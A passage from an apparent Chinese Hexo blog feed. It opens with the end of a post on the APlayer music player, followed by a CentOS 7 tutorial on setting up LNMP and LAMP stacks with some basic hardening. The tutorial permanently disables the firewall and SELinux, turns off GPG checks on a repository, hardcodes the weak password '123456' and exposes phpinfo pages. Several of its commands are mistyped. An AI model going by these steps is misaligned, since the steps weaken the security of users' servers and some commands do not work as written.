class="hljs-comment">//音频艺术家</span><br>            <span class="hljs-attr">url</span>: <span class="hljs-string">&#x27;/dist/music/This is the show.mp3&#x27;</span>, <span class="hljs-comment">//音频外链</span><br>            <span class="hljs-attr">cover</span>: <span class="hljs-string">&#x27;https://p1.music.126.net/LdYemYBR_IiERIfM3uMsEg==/109951163339791625.jpg?param=177y177&#x27;</span>, <span class="hljs-comment">//音频封面</span><br>            <span class="hljs-attr">lrc</span>: <span class="hljs-string">&#x27;dist/music/This is the show.lrc&#x27;</span>, <span class="hljs-comment">//音频歌词，配合上面的lrcType使用</span><br>        &#125;,<br>        <br>    ]<br>&#125;);<br></code></pre></td></tr></table></figure><p>我用的是吸底模式，一共有四种模式，如果想切换成别的模式可以根据<a href="https://aplayer.js.org/#/zh-Hans/?id=%E6%92%AD%E6%94%BE%E5%88%97%E8%A1%A8">官方文档</a>进行修改。</p><p>设定好了样式，就把下面的代码放入**_layout.swig<strong>的</strong>body标签**中。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/dist/APlayer.min.css&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;aplayer&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;/dist/APlayer.min.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;/dist/music.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.simon96.online/2018/10/12/hexo-tutorial/">https://www.simon96.online/2018/10/12/hexo-tutorial/</a></p><p><a href="https://blog.csdn.net/qq_36759224/article/details/85420403#font_colorFF0000___font_129">https://blog.csdn.net/qq_36759224/article/details/85420403#font_colorFF0000___font_129</a></p><p><a href="https://imjad.cn/archives/lab/add-dynamic-poster-girl-with-live2d-to-your-blog-02">https://imjad.cn/archives/lab/add-dynamic-poster-girl-with-live2d-to-your-blog-02</a></p><p><a href="https://blog.yleao.com/2018/0902/hexo%E4%B8%8A%E7%9A%84aplayer%E5%BA%94%E7%94%A8.html">https://blog.yleao.com/2018/0902/hexo%E4%B8%8A%E7%9A%84aplayer%E5%BA%94%E7%94%A8.html</a></p>]]></content>
    
    
    <categories>
      
      <category>博客相关</category>
      
    </categories>
    
    
    <tags>
      
      <tag>旧文章</tag>
      
      <tag>hexo</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>centos7 lnmp环境搭建</title>
    <link href="/2019/08/06/old/centos7-lnmp%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    <url>/2019/08/06/old/centos7-lnmp%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<p>由于是第一次搭建环境，踩了不少坑。中途各种error，感觉很苦手，不过学下来还是很有收获。</p><span id="more"></span><h2 id="一、LNMP"><a href="#一、LNMP" class="headerlink" title="一、LNMP"></a>一、LNMP</h2><p><strong>（centos7+nginx1.16+mysql5.7+php7）</strong></p><h3 id="1-编译环境"><a href="#1-编译环境" class="headerlink" title="1.编译环境"></a>1.编译环境</h3><h4 id="1-1关闭防火墙"><a href="#1-1关闭防火墙" class="headerlink" title="1.1关闭防火墙"></a>1.1关闭防火墙</h4><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nsis"><span class="hljs-params">system</span>ctl status firewalld  <span class="hljs-comment">#查看防火墙状态（inactive为关闭，active为开启）</span><br><span class="hljs-params">system</span>ctl stop firewalld    <span class="hljs-comment">#暂时关闭防火墙</span><br><span class="hljs-params">system</span>ctl disable firewalld <span class="hljs-comment">#永久关闭防火墙</span><br></code></pre></td></tr></table></figure><h4 id="1-2-关闭SELinux"><a href="#1-2-关闭SELinux" class="headerlink" title="1.2 关闭SELinux"></a>1.2 关闭SELinux</h4><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">getenforce</span>  <span class="hljs-comment">#查看SElinux状态</span><br>getenforce0 <span class="hljs-comment">#暂时关闭</span><br></code></pre></td></tr></table></figure><!-- more --><p>*永久关闭，修改&#x2F;etc&#x2F;selinux&#x2F;config ,将SELINUX&#x3D;enforcing 为 SELINUX&#x3D;disabled。</p><p><img src="https://i.loli.net/2019/08/07/1RSgNDI7OMCHXiy.png" alt="1564765401246.png"></p><h3 id="2-安装Nginx"><a href="#2-安装Nginx" class="headerlink" title="2.安装Nginx"></a>2.安装Nginx</h3><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">yum -y <span class="hljs-keyword">install</span> nginx<br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/08/07/5iJWcXeGYBFzdua.png" alt="1564765485371.png"></p><p>发现无法直接安装。因为yum源中没有nginx，所以我们要添加一个nginx.repo。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">vi <span class="hljs-regexp">/etc/yum</span>.repos.d/nginx.repo<br></code></pre></td></tr></table></figure><p>源文件内容:</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[nginx]</span><br><span class="hljs-attr">name</span>=nginx repo<br><span class="hljs-attr">baseurl</span>=http://nginx.org/packages/centos/<span class="hljs-variable">$releasever</span>/<span class="hljs-variable">$basearch</span>/<br><span class="hljs-attr">gpgcheck</span>=<span class="hljs-number">0</span><br><span class="hljs-attr">enabled</span>=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>查看nginx是否配置成功：</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs lsl">yum <span class="hljs-type">list</span> nginx<br>yum <span class="hljs-type">list</span> |grep nginx<br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/08/07/ni3MqyfzS1IjphR.png" alt="1564765773786.png"></p><p>安装nginx：</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cmake">yum -y <span class="hljs-keyword">install</span> nginx<br>nginx <span class="hljs-comment">#启动Nignx</span><br></code></pre></td></tr></table></figure><p>查询是否安装成功：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">Nginx</span> -v <span class="hljs-comment">#查看版本号</span><br>curl <span class="hljs-number">127.0.0.1</span>  <span class="hljs-comment">#用curl查看是否安装成功，若成功，输出html反馈</span><br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/08/07/dFwSXlgnzbBkrUj.png" alt="1564766054290.png"></p><h3 id="3-安装mysql"><a href="#3-安装mysql" class="headerlink" title="3.安装mysql"></a>3.安装mysql</h3><p>更新yum源：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">rpm -Uvh http:<span class="hljs-regexp">//</span>dev.mysql.com<span class="hljs-regexp">/get/my</span>sql57-community-release-el7-<span class="hljs-number">9</span>.noarch.rpm<br></code></pre></td></tr></table></figure><p>查看5.7版本是否启用：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">yum repolist <span class="hljs-keyword">all</span> | <span class="hljs-keyword">grep</span> mysql<br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/08/07/TN3h4i7pPUnrmEy.png" alt="1564766177432.png"></p><p>此处是已启用，若未启用则可修改源文件（vim &#x2F;etc&#x2F;yum.repos.d&#x2F;mysql-community.repo）将5.7版的enable设为1，其他的版本设为0.</p><p>查看可用的版本（有5.7即可安装）：</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">yum repolist enabled <span class="hljs-string">| grep mysql</span><br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/08/07/irOZo1XMCpnxWuN.png" alt="1.png"></p><p>安装（需要漫长的等待）：</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta">yum -y install mysql-community-<span class="hljs-keyword">server</span><br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/08/07/PFHsxiu2y5QgXJY.png" alt="1564766424952.png"></p><p>完成！</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">mysql -V<span class="hljs-comment">#查看版本号，有返回结果则表示安装成功</span><br>service mysqld <span class="hljs-literal">start</span><span class="hljs-comment">#启动mysql</span><br>service mysqld status<span class="hljs-comment">#查看启动状态</span><br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/08/07/Qw6ARd9EIfvnKye.png" alt="1564766647203.png"></p><h3 id="4-安装php"><a href="#4-安装php" class="headerlink" title="4.安装php"></a>4.安装php</h3><p>更新yum源：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">rpm -Uvh https:<span class="hljs-regexp">//</span>dl.fedoraproject.org<span class="hljs-regexp">/pub/</span>epel/epel-release-latest-<span class="hljs-number">7</span>.noarch.rpm<br>rpm -Uvh https:<span class="hljs-regexp">//mi</span>rror.webtatic.com<span class="hljs-regexp">/yum/</span>el7/webtatic-release.rpm<br></code></pre></td></tr></table></figure><p>安装php：</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs smali">yum install php70w.x86_64 php70w-cli.x86_64 php70w-common.x86_64 php70w-gd.x86_64 php70w-ldap.x86_64 php70w-mbstring.x86_64 php70w-mcrypt.x86_64 php70w-mysql.x86_64 php70w-pdo.x86_64<br></code></pre></td></tr></table></figure><p>安装php-fpm：</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs smali">yum install php70w-fpm php70w-opcache<br></code></pre></td></tr></table></figure><p>启动php-fpm：</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">systemctl <span class="hljs-literal">start</span> php-fpm<br></code></pre></td></tr></table></figure><p>查看是否安装成功：</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">php-v</span><br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/08/07/p4ix8JohtWcsebF.png" alt="1564766881529.png"></p><h3 id="5-配置"><a href="#5-配置" class="headerlink" title="5.配置"></a>5.配置</h3><h4 id="5-1-配置Nginx"><a href="#5-1-配置Nginx" class="headerlink" title="5.1 配置Nginx"></a>5.1 配置Nginx</h4><p>备份文件：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">cp <span class="hljs-regexp">/etc/</span>nginx<span class="hljs-regexp">/nginx.conf /</span>etc<span class="hljs-regexp">/nginx/</span>nginx.conf.bak<br></code></pre></td></tr></table></figure><p>打开配置文件：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">vim <span class="hljs-regexp">/etc/</span>nginx/nginx.conf<br></code></pre></td></tr></table></figure><p>修改配置（如下）：</p><p><img src="https://i.loli.net/2019/08/07/d8vWQjwpFBsPZzX.png" alt="1564766989315.png"></p><p>重启服务：</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">service nginx restart</span><br></code></pre></td></tr></table></figure><h4 id="5-2-配置mysql"><a href="#5-2-配置mysql" class="headerlink" title="5.2 配置mysql"></a>5.2 配置mysql</h4><p>启动mysql服务：</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">systemctl <span class="hljs-literal">start</span> mysqld<br></code></pre></td></tr></table></figure><p>设置mysql开机自启动：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">systemctl <span class="hljs-built_in">enable</span> mysqld<br></code></pre></td></tr></table></figure><h4 id="5-3-配置php"><a href="#5-3-配置php" class="headerlink" title="5.3 配置php"></a>5.3 配置php</h4><p>启动php-fpm：</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">systemctl <span class="hljs-literal">start</span> php-fpm<br></code></pre></td></tr></table></figure><p>设置自启动：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">systemctl <span class="hljs-built_in">enable</span> php-fpm<br></code></pre></td></tr></table></figure><h4 id="5-4-测试"><a href="#5-4-测试" class="headerlink" title="5.4 测试"></a>5.4 测试</h4><p>在&#x2F;usr&#x2F;share&#x2F;php目录下新建phpinfo.php文件，用于展示phpinfo信息。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">vim <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/php/</span>phpinfo.php<br></code></pre></td></tr></table></figure><p>内容：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/08/07/3cjUBbn4MTLluIV.png" alt="1564767534260.png"></p><p>新建mysql.php文件</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">vim <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/php/my</span>sql.php<br></code></pre></td></tr></table></figure><p>内容：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$conn</span> = <span class="hljs-title function_ invoke__">mysqli_connect</span>(<span class="hljs-string">&#x27;localhost&#x27;</span>,<span class="hljs-string">&#x27;root&#x27;</span>,<span class="hljs-string">&#x27;123456&#x27;</span>);  <span class="hljs-comment">#123456为mysql的密码</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$conn</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;mysql success!!&#x27;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/08/07/SmFZie9cB8bCQ65.png" alt="1564772802636.png"></p><h3 id="6-简单加固"><a href="#6-简单加固" class="headerlink" title="6.简单加固"></a>6.简单加固</h3><h4 id="6-1-linux用户"><a href="#6-1-linux用户" class="headerlink" title="6.1 linux用户"></a>6.1 linux用户</h4><h5 id="（1）设定密码策略"><a href="#（1）设定密码策略" class="headerlink" title="（1）设定密码策略"></a>（1）设定密码策略</h5><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">vi <span class="hljs-regexp">/etc/</span>login.defs<br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/08/07/sfuUgPtGh9XVBJI.png" alt="1564774021401.png"></p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs tap">PASS_MAX_DAYS    <span class="hljs-number"> 90 </span>              <span class="hljs-comment">#密码最长有效期</span><br>PASS_MIN_DAYS    <span class="hljs-number"> 10 </span>              <span class="hljs-comment">#密码修改之间最小的天数</span><br>PASS_MIN_LEN     <span class="hljs-number"> 8 </span>               <span class="hljs-comment">#密码长度</span><br>PASS_WARN_AGE    <span class="hljs-number"> 7 </span>               <span class="hljs-comment">#口令失效前多少天开始通知用户修改密码</span><br></code></pre></td></tr></table></figure><h5 id="（2）对用户密码强度进行设定"><a href="#（2）对用户密码强度进行设定" class="headerlink" title="（2）对用户密码强度进行设定"></a>（2）对用户密码强度进行设定</h5><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">vi <span class="hljs-regexp">/etc/</span>pam.d/sysetm-auth <br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/08/07/Fx5gQ2VCYDJP3iO.png" alt="1564774418247.png"></p><p>修改为：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">password    requisite     pam_pwquality.so try_first_pass local_users_only <span class="hljs-attribute">retry</span>=3 authtok_type=  <span class="hljs-attribute">difok</span>=1 <span class="hljs-attribute">minlen</span>=8 <span class="hljs-attribute">ucredit</span>=-1 <span class="hljs-attribute">lcredit</span>=-1 <span class="hljs-attribute">dcredit</span>=-1<br></code></pre></td></tr></table></figure><p>difok&#x3D; ：此选项用来定义新密码中必须要有几个字符和旧密码不同<br>minlen&#x3D;：此选项用来设置新密码的最小长度<br>ucredit&#x3D; ：此选项用来设定新密码中可以包含的大写字母的最大数目。-1 至少一个<br>lcredit&#x3D;：此选项用来设定新密码中可以包含的小写字母的最大数目<br>dcredit&#x3D;：此选项用来设定新密码中可以包含的数字的最大数目 </p><h5 id="（3）对用户的登录次数进行限制"><a href="#（3）对用户的登录次数进行限制" class="headerlink" title="（3）对用户的登录次数进行限制"></a>（3）对用户的登录次数进行限制</h5><p>有些软件可以通过暴力破解的方法，反复的尝试登录已破解密码。所以要对用户的登录次数进行限制。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">vi <span class="hljs-regexp">/etc/</span>pam.d/sshd<br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/08/07/MZB4sQ6rUjiAwlm.png" alt="1564775069881.png"></p><p>在#%PAM-2.0下添加：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">auth required pam_tally2.so <span class="hljs-attribute">deny</span>=3 <span class="hljs-attribute">unlock_time</span>=150 even_deny_root root_unlock_time300<br></code></pre></td></tr></table></figure><p>意为，用户密码错误3次，锁定150秒。root用户密码错误3次，锁定300秒。</p><h4 id="6-2-mysql加固"><a href="#6-2-mysql加固" class="headerlink" title="6.2 mysql加固"></a>6.2 mysql加固</h4><p>查看文件，获取root用户的初始密码：</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">grep <span class="hljs-string">&#x27;temporary password&#x27;</span> /<span class="hljs-keyword">var</span>/<span class="hljs-built_in">log</span>/mysqld.<span class="hljs-built_in">log</span><br></code></pre></td></tr></table></figure><p>配置mysql的安全性：</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">mysql_secure_installation</span><br></code></pre></td></tr></table></figure><p>重置密码（输入刚才获取的root初始密码）：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment">#修改root密码（长度为8至30个字符，必须同时包含大小写英文字母、数字和特殊符号）</span><br>Change the password <span class="hljs-keyword">for</span> root ? ((Press y|Y <span class="hljs-keyword">for</span> <span class="hljs-literal">Yes</span>, any other key <span class="hljs-keyword">for</span> <span class="hljs-literal">No</span>) : y <br><br><span class="hljs-comment">#删除匿名用户</span><br><span class="hljs-built_in">Remove</span> anonymous users? (Press y|Y <span class="hljs-keyword">for</span> <span class="hljs-literal">Yes</span>, any other key <span class="hljs-keyword">for</span> <span class="hljs-literal">No</span>) :  y<br><br><span class="hljs-comment">#禁止root远程登录</span><br>Disallow root login remotely? (Press y|Y <span class="hljs-keyword">for</span> <span class="hljs-literal">Yes</span>, any other key <span class="hljs-keyword">for</span> <span class="hljs-literal">No</span>) : y<br><br><span class="hljs-comment">#是否删除test库和对它的访问权限，输入</span><br><span class="hljs-built_in">Remove</span> test database <span class="hljs-keyword">and</span> access <span class="hljs-keyword">to</span> it? (Press y|Y <span class="hljs-keyword">for</span> <span class="hljs-literal">Yes</span>, any other key <span class="hljs-keyword">for</span> <span class="hljs-literal">No</span>) : y <br><br><span class="hljs-comment">#是否重新加载授权表</span><br>Reload privilege tables now? (Press y|Y <span class="hljs-keyword">for</span> <span class="hljs-literal">Yes</span>, any other key <span class="hljs-keyword">for</span> <span class="hljs-literal">No</span>) :  y<br></code></pre></td></tr></table></figure><h3 id="7-遇到的问题以及解决方案"><a href="#7-遇到的问题以及解决方案" class="headerlink" title="7.遇到的问题以及解决方案"></a>7.遇到的问题以及解决方案</h3><h4 id="7-1-网络不通"><a href="#7-1-网络不通" class="headerlink" title="7.1 网络不通"></a>7.1 网络不通</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /etc/sysconfig/network-scripts<br><span class="hljs-built_in">ls</span><br>vim ifcfg-ens33<span class="hljs-comment">#也有可能会是别的名字，根据实际情况改</span><br></code></pre></td></tr></table></figure><p>修改<strong>ONBOOT&#x3D;yes</strong></p><p>重启服务：</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">service network restart</span><br></code></pre></td></tr></table></figure><h4 id="7-2-yum-pid-已被锁定"><a href="#7-2-yum-pid-已被锁定" class="headerlink" title="7.2 yum.pid 已被锁定"></a>7.2 yum.pid 已被锁定</h4><p><img src="https://i.loli.net/2019/08/07/IQSZF4JkMd3v15b.png" alt="1564767799373.png"></p><p>解决方法：</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">rm</span> -rf /<span class="hljs-keyword">var</span>/<span class="hljs-keyword">run</span>/yum.pid<br></code></pre></td></tr></table></figure><h4 id="7-3-80端口被占用，nginx无法启动"><a href="#7-3-80端口被占用，nginx无法启动" class="headerlink" title="7.3 80端口被占用，nginx无法启动"></a>7.3 80端口被占用，nginx无法启动</h4><p><img src="https://i.loli.net/2019/08/07/lhc1OpSiIkNmL3n.png" alt="1564769528812.png"></p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">netstat</span> -ltunp<span class="hljs-comment">#查看端口</span><br>lsof -i:<span class="hljs-number">80</span><span class="hljs-comment">#查看80端口</span><br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/08/07/WDu8cNhQaz3OjpE.png" alt="1564769484707.png"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">kill</span> -<span class="hljs-number">9</span> <span class="hljs-number">41636</span><br><span class="hljs-attribute">kill</span> -<span class="hljs-number">9</span> <span class="hljs-number">41638</span><br><span class="hljs-attribute">service</span> nginx start#启动<br></code></pre></td></tr></table></figure><h2 id="二、LAMP"><a href="#二、LAMP" class="headerlink" title="二、LAMP"></a>二、LAMP</h2><h3 id="1-安装Apache"><a href="#1-安装Apache" class="headerlink" title="1.安装Apache"></a>1.安装Apache</h3><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">yum <span class="hljs-keyword">install</span> httpd httpd-devel<br></code></pre></td></tr></table></figure><p>启动Apache服务：</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">systemctl <span class="hljs-literal">start</span> httpd<br></code></pre></td></tr></table></figure><p>设置httpd服务开机启动：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">systemctl <span class="hljs-built_in">enable</span>  httpd<br></code></pre></td></tr></table></figure><p>查看状态：</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">systemctl status httpd</span><br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/08/07/cUaMdeq7Bp4X1ZA.png" alt="1564777207163.png"></p><p><img src="https://i.loli.net/2019/08/07/2HGzPth1V3W7Z8d.png" alt="1564777332886.png"></p><p>安装成功。</p><h3 id="2-安装mysql"><a href="#2-安装mysql" class="headerlink" title="2.安装mysql"></a>2.安装mysql</h3><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta">yum install mariadb mariadb-<span class="hljs-keyword">server</span> mariadb-libs mariadb-devel<br></code></pre></td></tr></table></figure><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">rpm -<span class="hljs-keyword">qa</span> |<span class="hljs-keyword">grep</span> maria<br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/08/07/PCsZmazelgwTFkL.png" alt="1564777928551.png"></p><p>设置开机启动：</p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nsis"><span class="hljs-params">system</span>ctl start  mariadb <br><span class="hljs-params">system</span>ctl enable  mariadb <br></code></pre></td></tr></table></figure><h3 id="3-安装php"><a href="#3-安装php" class="headerlink" title="3.安装php"></a>3.安装php</h3><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">yum -y <span class="hljs-keyword">install</span> php<br></code></pre></td></tr></table></figure><p>关联php和mysql：</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">yum <span class="hljs-keyword">install</span> php-mysql<br></code></pre></td></tr></table></figure><p>安装常用php模块：</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">yum install -y php-gd php-ldap php-odbc php-pear php-<span class="hljs-keyword">xml</span> <span class="hljs-title">php-xmlrpc</span> php-mbstring php-snmp php-soap curl curl-devel php-bcmath<br></code></pre></td></tr></table></figure><h3 id="4-测试"><a href="#4-测试" class="headerlink" title="4.测试"></a>4.测试</h3><p>在&#x2F;var&#x2F;www&#x2F;html目录下新建info.php文件，用于展示info信息。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">vi <span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/i</span>nfo.php<br></code></pre></td></tr></table></figure><p>内容：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<br><span 